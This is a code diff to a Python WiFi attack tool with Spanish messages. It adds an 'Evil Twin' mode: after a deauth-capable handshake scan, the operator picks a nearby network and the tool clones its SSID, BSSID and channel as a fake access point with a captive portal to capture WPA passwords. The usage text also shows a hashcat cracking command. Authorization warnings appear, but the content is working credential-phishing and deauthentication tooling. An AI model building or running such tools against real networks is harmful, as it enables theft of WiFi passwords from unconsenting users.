@@ -7,12 +7,14 @@ import os
 import signal
 import sys
 import threading
+import time
 from pathlib import Path
 
 from scapy.all import sniff
 
 from .capture import HandshakeCapture
 from .display import TerminalDisplay
+from .eviltwin import EvilTwinAP
 from .interface import InterfaceManager
 from .saver import HandshakeSaver
 
@@ -30,10 +32,13 @@ def _build_parser() -> argparse.ArgumentParser:
         epilog=(
             "Ejemplos:\n"
             "  sudo python3 wifi_scanner.py -i wlan0\n"
-            "  sudo python3 wifi_scanner.py -i wlan0 -o /tmp/capturas --deauth\n\n"
+            "  sudo python3 wifi_scanner.py -i wlan0 -o /tmp/capturas --deauth\n"
+            "  sudo python3 wifi_scanner.py -i wlan0 --eviltwin\n"
+            "  sudo python3 wifi_scanner.py -i wlan0 --eviltwin --scan-time 30\n\n"
             "hashcat (tras capturar):\n"
             "  hashcat -m 22000 capturas/MiRed_*.hc22000 wordlist.txt\n\n"
-            "AVISO: --deauth solo debe usarse en redes propias o con autorización explícita."
+            "AVISO: --deauth y --eviltwin solo deben usarse en redes propias o con "
+            "autorización escrita y explícita. El uso no autorizado es ilegal."
         ),
     )
 
@@ -48,6 +53,12 @@ def main() -> None:
                         help="Enviar frames deauth para forzar reconexión (solo redes autorizadas)")
     parser.add_argument("--no-hop", dest="hop", action="store_false", default=True,
                         help="Desactiva el salto de canal (fija el canal actual)")
+    parser.add_argument("--eviltwin", action="store_true",
+                        help="Modo Evil Twin: escanea redes, elige un objetivo y levanta un AP "
+                             "falso con portal cautivo para capturar contraseñas WPA. "
+                             "Solo para redes propias o con autorización explícita.")
+    parser.add_argument("--scan-time", type=int, default=20, metavar="SEC",
+                        help="Segundos de escaneo previo al Evil Twin (def: 20)")
 
     args = parser.parse_args()
     _check_root()
@@ -101,9 +112,94 @@ def main() -> None:
     display.render(capture.networks, capture.handshakes, capture.eapol_sessions)
     print(f"[*] Escaneando en {args.interface}...\n")
 
+    if args.eviltwin:
+        # Escanear durante scan_time segundos para descubrir redes cercanas
+        threading.Timer(args.scan_time, stop_sniff.set).start()
+        print(f"[*] Modo Evil Twin: escaneando {args.scan_time} s para detectar objetivos...\n")
+
     sniff(
         iface=args.interface,
         prn=capture.packet_handler,
         store=False,
         stop_filter=lambda _: stop_sniff.is_set(),
     )
+
+    if args.eviltwin:
+        _run_eviltwin(args, capture, iface_mgr, hop_stop, deauth_stop, output_dir)
+
+
+def _run_eviltwin(
+    args,
+    capture: "HandshakeCapture",
+    iface_mgr: "InterfaceManager",
+    hop_stop: threading.Event,
+    deauth_stop: threading.Event,
+    output_dir: Path,
+) -> None:
+    """Presenta el menú de selección de objetivo y lanza el EvilTwinAP."""
+    hop_stop.set()
+    deauth_stop.set()
+
+    networks = capture.networks
+    if not networks:
+        print("[-] No se detectaron redes. Aumenta --scan-time o acércate al objetivo.")
+        return
+
+    # Mostrar tabla de redes detectadas
+    entries = list(networks.items())
+    print("\n" + "─" * 72)
+    print(f"  {'#':>3}  {'SSID':<28}  {'BSSID':<17}  {'CH':>3}  {'ENC'}")
+    print("─" * 72)
+    for idx, (bssid, info) in enumerate(entries, start=1):
+        print(
+            f"  {idx:>3}  {info.ssid[:28]:<28}  {bssid:<17}  "
+            f"{info.channel:>3}  {info.encryption}"
+        )
+    print("─" * 72)
+
+    # Selección del objetivo
+    while True:
+        try:
+            raw = input("\n[?] Selecciona el número del objetivo (0 = cancelar): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print("\n[!] Cancelado.")
+            iface_mgr.restore_managed_mode()
+            return
+
+        if raw == "0":
+            print("[!] Cancelado.")
+            iface_mgr.restore_managed_mode()
+            return
+
+        if raw.isdigit() and 1 <= int(raw) <= len(entries):
+            target_bssid, target_info = entries[int(raw) - 1]
+            break
+
+        print(f"[-] Entrada inválida. Introduce un número entre 1 y {len(entries)}.")
+
+    print(
+        f"\n[+] Objetivo seleccionado: '{target_info.ssid}' "
+        f"({target_bssid}, canal {target_info.channel})"
+    )
+
+    et = EvilTwinAP(
+        iface=args.interface,
+        ssid=target_info.ssid,
+        bssid=target_bssid,
+        channel=target_info.channel,
+        output_dir=output_dir,
+    )
+
+    et_stop = threading.Event()
+
+    def _on_et_exit(sig, frame):
+        et_stop.set()
+
+    import signal as _signal
+    _signal.signal(_signal.SIGINT,  _on_et_exit)
+    _signal.signal(_signal.SIGTERM, _on_et_exit)
+
+    try:
+        et.start(et_stop)
+    finally:
+        et.stop()
